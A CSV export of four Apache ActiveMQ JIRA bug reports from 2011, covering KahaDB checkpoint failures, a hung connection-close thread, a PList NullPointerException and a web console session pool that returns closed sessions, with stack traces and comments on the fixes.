checkpoint contention with large transaction write using temp file,AMQ-3443,12518338,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,gtully,gtully,09/Aug/11 17:46,20/Sep/11 10:42,14/Jul/23 05:43,19/Aug/11 11:27,5.x,,,,,5.6.0,,,Message Store,,,,0,,,,,,,,,"Unit test failure intermittently: 
 org.apache.activemq.bugs » AMQ2149KahaDBTest » testQueueTransactionalOrderWithRestart

{code}2011-08-09 05:25:21,468 [eckpoint Worker] - ERROR MessageDatabase                - Checkpoint failed
java.io.IOException: Cannot create recovery file. Reason: java.io.FileNotFoundException: target/testQueueTransactionalOrderWithRestart/testQueueTransactionalOrderWithRestart/KahaDB/tx-7648-1312867516460.tmp (No such file or directory)
	at org.apache.kahadb.util.IOExceptionSupport.create(IOExceptionSupport.java:27)
	at org.apache.kahadb.page.PageFile.writeBatch(PageFile.java:1002)
	at org.apache.kahadb.page.PageFile.flush(PageFile.java:482)
	at org.apache.activemq.store.kahadb.MessageDatabase.checkpointUpdate(MessageDatabase.java:1167)
	at org.apache.activemq.store.kahadb.MessageDatabase$10.execute(MessageDatabase.java:728)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:762)
	at org.apache.activemq.store.kahadb.MessageDatabase.checkpointCleanup(MessageDatabase.java:726)
	at org.apache.activemq.store.kahadb.MessageDatabase.checkpointCleanup(MessageDatabase.java:714)
	at org.apache.activemq.store.kahadb.MessageDatabase$3.run(MessageDatabase.java:279)
Caused by: java.io.FileNotFoundException: target/testQueueTransactionalOrderWithRestart/testQueueTransactionalOrderWithRestart/KahaDB/tx-7648-1312867516460.tmp (No such file or directory)
	at java.io.RandomAccessFile.open(Native Method)
	at java.io.RandomAccessFile.<init>(RandomAccessFile.java:212)
	at org.apache.kahadb.page.PageFile$PageWrite.getDiskBound(PageFile.java:185)
	at org.apache.kahadb.page.PageFile.writeBatch(PageFile.java:1000)
	... 7 more
2011-08-09 05:25:21,469 [eckpoint Worker] - INFO  DefaultIOExceptionHandler      - Stopping the broker due to IO exception, java.io.IOException: Cannot create recovery file. Reason: java.io.FileNotFoundException: target/testQueueTransactionalOrderWithRestart/testQueueTransactionalOrderWithRestart/KahaDB/tx-7648-1312867516460.tmp (No such file or directory)
java.io.IOException: Cannot create recovery file. Reason: java.io.FileNotFoundException: target/testQueueTransactionalOrderWithRestart/testQueueTransactionalOrderWithRestart/KahaDB/tx-7648-1312867516460.tmp (No such file or directory)
	at org.apache.kahadb.util.IOExceptionSupport.create(IOExceptionSupport.java:27)
	at org.apache.kahadb.page.PageFile.writeBatch(PageFile.java:1002)
	at org.apache.kahadb.page.PageFile.flush(PageFile.java:482)
	at org.apache.activemq.store.kahadb.MessageDatabase.checkpointUpdate(MessageDatabase.java:1167)
	at org.apache.activemq.store.kahadb.MessageDatabase$10.execute(MessageDatabase.java:728)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:762)
	at org.apache.activemq.store.kahadb.MessageDatabase.checkpointCleanup(MessageDatabase.java:726)
	at org.apache.activemq.store.kahadb.MessageDatabase.checkpointCleanup(MessageDatabase.java:714)
	at org.apache.activemq.store.kahadb.MessageDatabase$3.run(MessageDatabase.java:279)
Caused by: java.io.FileNotFoundException: target/testQueueTransactionalOrderWithRestart/testQueueTransactionalOrderWithRestart/KahaDB/tx-7648-1312867516460.tmp (No such file or directory){code}",,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3374,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14553,,,Fri Aug 19 11:27:39 UTC 2011,,,,,,,,,,,"0|i0aj2f:",59362,Regression,Unit Test Broken,,,,,,,,,,,,,,,,,,,"10/Aug/11 10:16;gtully;second stack, from: org.apache.activemq.usecases.DurableUnsubscribeTest.testUnsubscribe
{code}java.io.IOException: Cannot create recovery file. Reason: java.io.FileNotFoundException: target/activemq-data/testUnsubscribe/KahaDB/tx-1130-1312961797127.tmp (No such file or directory)
	at org.apache.kahadb.util.IOExceptionSupport.create(IOExceptionSupport.java:27)
	at org.apache.kahadb.page.PageFile.writeBatch(PageFile.java:1002)
	at org.apache.kahadb.page.PageFile.flush(PageFile.java:482)
	at org.apache.activemq.store.kahadb.MessageDatabase.checkpointUpdate(MessageDatabase.java:1167)
	at org.apache.activemq.store.kahadb.MessageDatabase$4.execute(MessageDatabase.java:379)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:762)
	at org.apache.activemq.store.kahadb.MessageDatabase.close(MessageDatabase.java:376)
	at org.apache.activemq.store.kahadb.MessageDatabase.unload(MessageDatabase.java:413)
	at org.apache.activemq.store.kahadb.MessageDatabase.doStop(MessageDatabase.java:204)
	at org.apache.activemq.store.kahadb.KahaDBStore.doStop(KahaDBStore.java:229)
	at org.apache.activemq.util.ServiceSupport.stop(ServiceSupport.java:70)
	at org.apache.activemq.store.kahadb.KahaDBPersistenceAdapter.stop(KahaDBPersistenceAdapter.java:174)
	at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41)
	at org.apache.activemq.broker.BrokerService.stop(BrokerService.java:596)
	at org.apache.activemq.usecases.DurableUnsubscribeTest.destroyBroker(DurableUnsubscribeTest.java:116)
	at org.apache.activemq.usecases.DurableUnsubscribeTest.tearDown(DurableUnsubscribeTest.java:99)
	at junit.framework.TestCase.runBare(TestCase.java:140)
	at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:90)
	at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:96)
	at junit.framework.TestResult$1.protect(TestResult.java:110)
	at junit.framework.TestResult.runProtected(TestResult.java:128)
	at junit.framework.TestResult.run(TestResult.java:113)
	at junit.framework.TestCase.run(TestCase.java:124)
	at junit.framework.TestSuite.runTest(TestSuite.java:232)
	at junit.framework.TestSuite.run(TestSuite.java:227)
	at org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:83)
	at org.apache.maven.surefire.junit4.JUnit4TestSet.execute(JUnit4TestSet.java:59)
	at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.executeTestSet(AbstractDirectoryTestSuite.java:115)
	at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.execute(AbstractDirectoryTestSuite.java:140)
	at org.apache.maven.surefire.Surefire.run(Surefire.java:109)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.apache.maven.surefire.booter.SurefireBooter.runSuitesInProcess(SurefireBooter.java:290)
	at org.apache.maven.surefire.booter.SurefireBooter.main(SurefireBooter.java:1017)
Caused by: java.io.FileNotFoundException: target/activemq-data/testUnsubscribe/KahaDB/tx-1130-1312961797127.tmp (No such file or directory)
	at java.io.RandomAccessFile.open(Native Method)
	at java.io.RandomAccessFile.<init>(RandomAccessFile.java:212)
	at org.apache.kahadb.page.PageFile$PageWrite.getDiskBound(PageFile.java:185)
	at org.apache.kahadb.page.PageFile.writeBatch(PageFile.java:1000)
	... 34 more{code};;;","19/Aug/11 11:27;dejanb;Should be fixed with svn revision 1159570;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Connection is taking a long time to close warning and  hung close thread,AMQ-3435,12517778,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,03/Aug/11 09:55,20/Sep/11 10:42,14/Jul/23 05:43,03/Aug/11 10:21,5.5.0,,,,,5.6.0,,,Transport,,,,0,,,,,,,,,"Info message in the log: {code}The connection to 'XXX' is taking a long time to shutdown.{code}
thread dump reveals call to stop from start without a relevant state change:{code}INFO   | jvm 1    | 2011/07/25 13:42:01 |    java.lang.Thread.State: TIMED_WAITING (parking)
INFO   | jvm 1    | 2011/07/25 13:42:01 | at sun.misc.Unsafe.park(Native Method)
INFO   | jvm 1    | 2011/07/25 13:42:01 | - parking to wait for <0x00002aaab557eee8> (a java.util.concurrent.CountDownLatch$Sync)
INFO   | jvm 1    | 2011/07/25 13:42:01 | at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:198)
INFO   | jvm 1    | 2011/07/25 13:42:01 | at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedNanos(AbstractQueuedSynchronizer.java:947)
INFO   | jvm 1    | 2011/07/25 13:42:01 | at java.util.concurrent.locks.AbstractQueuedSynchronizer.tryAcquireSharedNanos(AbstractQueuedSynchronizer.java:1339)
INFO   | jvm 1    | 2011/07/25 13:42:01 | at java.util.concurrent.CountDownLatch.await(CountDownLatch.java:253)
INFO   | jvm 1    | 2011/07/25 13:42:01 | at org.apache.activemq.broker.TransportConnection.stop(TransportConnection.java:936)
INFO   | jvm 1    | 2011/07/25 13:42:01 | at org.apache.activemq.broker.TransportConnection.start(TransportConnection.java:920)
INFO   | jvm 1    | 2011/07/25 13:42:01 | at org.apache.activemq.broker.TransportConnector$1$1.run(TransportConnector.java:217)
INFO   | jvm 1    | 2011/07/25 13:42:01 | at java.lang.Thread.run(Thread.java:619){code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14538,,,Wed Aug 03 10:21:52 UTC 2011,,,,,,,,,,,"0|i0aj3j:",59367,,,,,,,,,,,,,,,,,,,,,"03/Aug/11 10:21;gtully;fix in http://svn.apache.org/viewvc?rev=1153419&view=rev
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Contention in PLIist  creation results in NPE on load - FilePendingMessageCursor,AMQ-3434,12517771,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,03/Aug/11 09:15,12/Oct/15 04:35,14/Jul/23 05:43,03/Aug/11 10:23,5.5.0,,,,,5.6.0,,,Broker,,,,0,filependingmessagecursor,pliststore,,,,,,,"Ocassional ocurrance of stack trace{code}2011-06-30 16:02:09,903 [127.0.0.1:50524] ERROR FilePendingMessageCursor       - Caught an IO Exception getting the DiskList 98_PendingCursor:loadq-3
java.lang.NullPointerException
	at org.apache.kahadb.index.ListIndex.loadNode(ListIndex.java:203)
	at org.apache.kahadb.index.ListIndex.load(ListIndex.java:75)
	at org.apache.activemq.store.kahadb.plist.PListStore$1.execute(PListStore.java:219)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:729)
	at org.apache.activemq.store.kahadb.plist.PListStore.getPList(PListStore.java:216)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.getDiskList(FilePendingMessageCursor.java:454)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.flushToDisk(FilePendingMessageCursor.java:432)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.tryAddMessageLast(FilePendingMessageCursor.java:217)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.addMessageLast(FilePendingMessageCursor.java:193)
	at org.apache.activemq.broker.region.Queue.sendMessage(Queue.java:1629)
	at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:720)
	at org.apache.activemq.broker.region.Queue.send(Queue.java:652)
	at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:379)
	at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:523)
	at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)
	at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96)
	at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:304)
	at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)
	at org.apache.activemq.broker.UserIDBroker.send(UserIDBroker.java:56)
	at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135)
	at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:468)
	at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:681)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:316)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:180)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
	at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:81)
	at org.apache.activemq.transport.stomp.ProtocolConverter.sendToActiveMQ(ProtocolConverter.java:140)
	at org.apache.activemq.transport.stomp.ProtocolConverter.onStompSend(ProtocolConverter.java:257)
	at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:178)
	at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:70)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:221)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:203)
	at java.lang.Thread.run(Thread.java:662)
2011-06-30 16:02:09,912 [127.0.0.1:50524] ERROR FilePendingMessageCursor       - Caught an Exception adding a message: ActiveMQBytesMessage {commandId = 19796,
 responseRequired = false, messageId = ID:bigmacli-40948-1309463846336-2:105:-1:1:19794, originalDestination = null, originalTransactionId = null, producerId = ID:bigmacli-
40948-1309463846336-2:105:-1:1, destination = queue://loadq-3, transactionId = null, expiration = 0, timestamp = 1309464129898, arrival = 0, brokerInTime = 1309464129898, 
brokerOutTime = 0, correlationId = null, replyTo = null, persistent = false, type = null, priority = 4, groupID = null, groupSequence = 0, targetConsumerId = null, compressed = false, 
userID = null, content = org.apache.activemq.util.ByteSequence@665e2517, marshalledProperties = null, dataStructure = null, redeliveryCounter = 0, size = 0, properties = null, 
readOnlyProperties = true, readOnlyBody = true, droppable = false} ActiveMQBytesMessage{ bytesOut = null, dataOut = null, dataIn = null } first to FilePendingMessageCursor 

java.lang.RuntimeException: java.lang.NullPointerException
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.getDiskList(FilePendingMessageCursor.java:457)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.flushToDisk(FilePendingMessageCursor.java:432)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.tryAddMessageLast(FilePendingMessageCursor.java:217)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.addMessageLast(FilePendingMessageCursor.java:193)
	at org.apache.activemq.broker.region.Queue.sendMessage(Queue.java:1629)
	at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:720)
	at org.apache.activemq.broker.region.Queue.send(Queue.java:652)
	at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:379)
	at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:523)
	at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)
	at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96)
	at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:304)
	at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)
	at org.apache.activemq.broker.UserIDBroker.send(UserIDBroker.java:56)
	at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135)
	at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:468)
	at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:681)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:316)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:180)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
	at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:81)
	at org.apache.activemq.transport.stomp.ProtocolConverter.sendToActiveMQ(ProtocolConverter.java:140)
	at org.apache.activemq.transport.stomp.ProtocolConverter.onStompSend(ProtocolConverter.java:257)
	at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:178)
	at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:70)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:221)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:203)
	at java.lang.Thread.run(Thread.java:662)
Caused by: java.lang.NullPointerException
	at org.apache.kahadb.index.ListIndex.loadNode(ListIndex.java:203)
	at org.apache.kahadb.index.ListIndex.load(ListIndex.java:75)
	at org.apache.activemq.store.kahadb.plist.PListStore$1.execute(PListStore.java:219)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:729)
	at org.apache.activemq.store.kahadb.plist.PListStore.getPList(PListStore.java:216)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.getDiskList(FilePendingMessageCursor.java:454)
	... 28 more

 

2011-06-30 16:02:44,121 [Queue:loadq-9  ] ERROR Queue                          - Failed to page in more queue messages 
java.util.NoSuchElementException: Chunk stream does not exist, page: 63122 is marked free
	at org.apache.kahadb.index.ListNode$ListIterator.nextFromNextListNode(ListNode.java:149)
	at org.apache.kahadb.index.ListNode$ListIterator.hasNext(ListNode.java:160)
	at org.apache.activemq.store.kahadb.plist.PList$PListIterator.hasNext(PList.java:203)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor$DiskIterator.hasNext(FilePendingMessageCursor.java:496)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.hasNext(FilePendingMessageCursor.java:288)
	at org.apache.activemq.broker.region.Queue.doPageInForDispatch(Queue.java:1725)
	at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1944)
	at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1452)
	at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:98)
	at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)
Caused by: java.io.EOFException: Chunk stream does not exist, page: 63122 is marked free
	at org.apache.kahadb.page.Transaction$2.readPage(Transaction.java:456)
	at org.apache.kahadb.page.Transaction$2.<init>(Transaction.java:433)
	at org.apache.kahadb.page.Transaction.openInputStream(Transaction.java:430)
	at org.apache.kahadb.page.Transaction.load(Transaction.java:406)
	at org.apache.kahadb.page.Transaction.load(Transaction.java:363)
	at org.apache.kahadb.index.ListIndex.loadNode(ListIndex.java:201)
	at org.apache.kahadb.index.ListNode$ListIterator.nextFromNextListNode(ListNode.java:147)
	... 9 more

 

2011-06-30 16:02:49,401 [Queue:loadq-4  ] ERROR Queue                          - Failed to page in more queue messages 
java.util.NoSuchElementException: Could not locate data file /lab/activemq-5.5.0-fuse-00-27/data/broker/tmp_storage/db-3.log
	at org.apache.activemq.store.kahadb.plist.PList$PListIterator.next(PList.java:213)
	at org.apache.activemq.store.kahadb.plist.PList$PListIterator.next(PList.java:192)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor$DiskIterator.next(FilePendingMessageCursor.java:501)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor$DiskIterator.next(FilePendingMessageCursor.java:485)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.next(FilePendingMessageCursor.java:296)
	at org.apache.activemq.broker.region.Queue.doPageInForDispatch(Queue.java:1726)
	at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1944)
	at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1452)
	at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:98)
	at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)
Caused by: java.io.IOException: Could not locate data file /lab/activemq-5.5.0-fuse-00-27/data/broker/tmp_storage/db-3.log
	at org.apache.kahadb.journal.Journal.getDataFile(Journal.java:350)
	at org.apache.kahadb.journal.Journal.read(Journal.java:597)
	at org.apache.activemq.store.kahadb.plist.PListStore.getPayload(PListStore.java:367)
	at org.apache.activemq.store.kahadb.plist.PList$PListIterator.next(PList.java:211)
	... 9 more{code}",stomp stress test,volkerk,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3375,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14550,,,Mon Oct 12 04:35:55 UTC 2015,,,,,,,,,,,"0|i0agtz:",59000,,,,,,,,,,,,,,,,,,,,,"03/Aug/11 10:23;gtully;resolved in  http://svn.apache.org/viewvc?rev=1153420&view=rev;;;","12/Oct/15 04:35;volkerk;Btw, even in 5.10 this very error can still be seen under circumstances leading to tmpDB corruption (such as AMQ-6005), now from line 308 of ListIndex.java;
{noformat}
305 	    ListNode<Key,Value> loadNode(Transaction tx, long pageId) throws IOException {
306 	        Page<ListNode<Key,Value>> page = tx.load(pageId, marshaller);
307 	        ListNode<Key, Value> node = page.get();
308 	        node.setPage(page);
{noformat}

At this point the broker is broken, futsch, kaput, and only a restart helps.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
activemq-web: SessionPool.returnSession() should discard sessions that are closed. ,AMQ-3430,12515900,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,tmielke,tmielke,01/Aug/11 10:39,20/Sep/11 10:42,14/Jul/23 05:43,01/Aug/11 11:50,5.5.0,5.x,,,,5.6.0,,,Broker,,,,0,"activemq-web-console,",SessionPool,,,,,,,"In activemq.web project, SessionPool.returnSession() does not check if the session is still open. As long as the session isn't null, its returned back to the pool.
At least one customer reported a problem when using the web console for browsing a queue, where the session was already closed. 

{noformat}
javax.jms.IllegalStateException: The Session is closed
at org.apache.activemq.ActiveMQSession.checkClosed(ActiveMQSession.java:722)
at org.apache.activemq.ActiveMQSession.createQueue(ActiveMQSession.java:1141)
at org.apache.activemq.web.QueueBrowseQuery.getQueue(QueueBrowseQuery.java:65)
at org.apache.activemq.web.QueueBrowseQuery.createBrowser(QueueBrowseQuery.java:91)
at org.apache.activemq.web.QueueBrowseQuery.getBrowser(QueueBrowseQuery.java:54)
at sun.reflect.GeneratedMethodAccessor125.invoke(Unknown Source)
at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
at java.lang.reflect.Method.invoke(Method.java:597)
at javax.el.BeanELResolver.getValue(BeanELResolver.java:62)
...
{noformat}

Not sure what triggered the closure of the session, however once it is closed it should not be returned to the pool but be discarded. If its not discarded, then the pool will always return the closed session and any invocations on the session return an exception. Restarting the broker is the only remedy.

 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"01/Aug/11 10:42;tmielke;AMQ-3430.patch;https://issues.apache.org/jira/secure/attachment/12488393/AMQ-3430.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14544,,,Mon Aug 01 11:50:27 UTC 2011,,,,,,,Patch Available,,,,"0|i0aj3z:",59369,,,,,,,,,,,,,,,,,,,,,"01/Aug/11 10:40;tmielke;full stack trace of the error reads:

{noformat}
javax.jms.IllegalStateException: The Session is closed
at org.apache.activemq.ActiveMQSession.checkClosed(ActiveMQSession.java:722)
at org.apache.activemq.ActiveMQSession.createQueue(ActiveMQSession.java:1141)
at org.apache.activemq.web.QueueBrowseQuery.getQueue(QueueBrowseQuery.java:65)
at org.apache.activemq.web.QueueBrowseQuery.createBrowser(QueueBrowseQuery.java:91)
at org.apache.activemq.web.QueueBrowseQuery.getBrowser(QueueBrowseQuery.java:54)
at sun.reflect.GeneratedMethodAccessor125.invoke(Unknown Source)
at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
at java.lang.reflect.Method.invoke(Method.java:597)
at javax.el.BeanELResolver.getValue(BeanELResolver.java:62)
at javax.el.CompositeELResolver.getValue(CompositeELResolver.java:54)
at org.apache.el.parser.AstValue.getValue(AstValue.java:123)
at org.apache.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:186)
at org.apache.jasper.runtime.PageContextImpl.proprietaryEvaluate(PageContextImpl.java:935)
at org.apache.jsp.browse_jsp._jspx_meth_jms_005fforEachMessage_005f0(browse_jsp.java:169)
at org.apache.jsp.browse_jsp._jspService(browse_jsp.java:103)
at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:377)
at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)
at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:83)
at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.apache.activemq.web.SessionFilter.doFilter(SessionFilter.java:45)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.apache.activemq.web.filter.ApplicationContextFilter.doFilter(ApplicationContextFilter.java:81)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at com.opensymphony.module.sitemesh.filter.PageFilter.parsePage(PageFilter.java:118)
at com.opensymphony.module.sitemesh.filter.PageFilter.doFilter(PageFilter.java:52)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:233)
at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:191)
at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:558)
at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:127)
at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:102)
at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109)
at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:298)
at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:852)
at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:588)
at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:489)
at java.lang.Thread.run(Thread.java:662)
{noformat};;;","01/Aug/11 10:42;tmielke;Attaching a possible fix including some logging for SessionPool.java
It was necessary to add a public method ActiveMQSession.isClosed() for checking if a session is closed.

;;;","01/Aug/11 11:50;dejanb;Patch committed with svn revision 1152747. Thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
